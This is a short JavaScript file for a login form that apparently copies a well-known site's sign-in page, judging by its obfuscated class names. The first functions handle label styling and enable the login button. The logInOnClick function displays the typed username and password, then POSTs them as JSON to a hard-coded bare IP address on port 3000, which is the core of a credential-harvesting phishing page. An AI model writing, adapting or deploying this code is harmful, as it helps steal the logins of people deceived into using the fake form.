// will add/remove the FATdn class to the username/password fields
function onUsernameInput() {
    var inputText = document.getElementById("username-input-box").value;
    if (inputText) {
        document.getElementById("username-input-label").className = "f0n8F FATdn";
    } else {
        document.getElementById("username-input-label").className = "f0n8F ";
    }
    activateLoginButton();
}

function onPasswordInput() {
    var inputText = document.getElementById("password-input-box").value;
    if (inputText) {
        document.getElementById("password-input-label").className = "f0n8F FATdn";
    } else {
        document.getElementById("password-input-label").className = "f0n8F ";
    }
    activateLoginButton();
}

function activateLoginButton() {
    var usernameInputText = document.getElementById("username-input-box").value;
    var passwordInputText = document.getElementById("password-input-box").value;
    if (usernameInputText && passwordInputText) {
        document.getElementById("login-button").removeAttribute("disabled");
    } else {
        document.getElementById("login-button").setAttribute("disabled", "disabled");
    }
}

function logInOnClick() {
    var usernameInputText = document.getElementById("username-input-box").value;
    var passwordInputText = document.getElementById("password-input-box").value;
    alert(usernameInputText + ", " + passwordInputText);
    const xhr = new XMLHttpRequest();
    xhr.open("POST", "23.233.39.254:3000", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({
        username: usernameInputText,
        passowrd: passwordInputText
    }));
}